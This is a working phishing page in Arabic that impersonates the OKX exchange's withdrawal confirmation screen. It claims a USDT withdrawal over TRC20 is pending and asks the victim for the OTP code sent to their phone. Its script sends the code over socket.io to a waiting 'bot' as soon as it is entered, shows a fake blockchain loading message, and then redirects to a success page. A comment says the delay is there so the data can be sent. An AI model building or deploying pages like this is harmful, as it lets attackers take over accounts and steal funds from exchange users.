<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد عملية السحب | OKX</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #000; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card { 
            background: #1a1a1a; 
            padding: 35px; 
            border-radius: 16px; 
            width: 90%; 
            max-width: 420px; 
            text-align: center; 
            border: 1px solid #333;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .logo { 
            width: 70px; 
            margin-bottom: 25px; 
        }
        h2 { 
            font-size: 22px; 
            margin-bottom: 12px; 
            font-weight: 600;
        }
        p { 
            color: #a1a1a1; 
            font-size: 14px; 
            margin-bottom: 25px; 
            line-height: 1.6;
        }
        .highlight {
            color: #fff;
            font-weight: bold;
            background: #333;
            padding: 2px 6px;
            border-radius: 4px;
        }
        input { 
            width: 100%; 
            padding: 15px; 
            margin-bottom: 20px; 
            border-radius: 10px; 
            border: 1px solid #444; 
            background: #000; 
            color: #fff; 
            text-align: center; 
            font-size: 26px; 
            letter-spacing: 8px; 
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #fff;
        }
        button { 
            width: 100%; 
            padding: 15px; 
            border-radius: 30px; 
            border: none; 
            background: #fff; 
            color: #000; 
            font-weight: bold; 
            cursor: pointer; 
            font-size: 17px; 
            transition: 0.3s;
        }
        button:hover {
            background: #e0e0e0;
        }
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        .loading-text { 
            display: none; 
            color: #f3ba2f; 
            font-size: 14px; 
            margin-top: 20px; 
            animation: blink 1s infinite;
        }
        @keyframes blink {
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>

<div class="card">
    <img src="static/logo.png" class="logo" alt="OKX">
    
    <h2>تأكيد سحب USDT</h2>
    <p>لقد طلبت سحب الرصيد إلى المحفظة المنتهية بـ <span class="highlight">yGid</span> عبر شبكة <span class="highlight">TRC20</span>.<br>يرجى إدخال رمز التحقق (OTP) المرسل لهاتفك لتأكيد المعاملة.</p>
    
    <form id="transferForm">
        <input type="text" id="otp_val" name="withdrawal_otp" placeholder="000000" required maxlength="6" autocomplete="off">
        <button type="submit" id="btn">تأكيد السحب الآن</button>
    </form>
    
    <div id="loading" class="loading-text">جاري معالجة المعاملة على الشبكة (Blockchain)...</div>
</div>

<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<script>
    const socket = io('http://localhost:3000');

    document.getElementById('transferForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const otpValue = document.getElementById('otp_val').value;
        const btn = document.getElementById('btn');
        const loading = document.getElementById('loading');

        if(otpValue.length < 6) {
            alert("يرجى إدخال الكود كاملاً");
            return;
        }

        // 1. إرسال الكود فوراً للبوت
        socket.emit('send_withdraw_otp', { code: otpValue });
        console.log("OTP sent to bot terminal: " + otpValue);

        // 2. تغيير شكل الزرار واللودنج
        btn.disabled = true;
        btn.innerText = "جاري التأكيد...";
        loading.style.display = 'block';

        // 3. التحويل لصفحة النجاح بعد 4 ثواني (عشان يلحق يبعت الداتا)
        setTimeout(() => {
            window.location.href = 'success.html';
        }, 4000);
    });
</script>

</body>
</html>
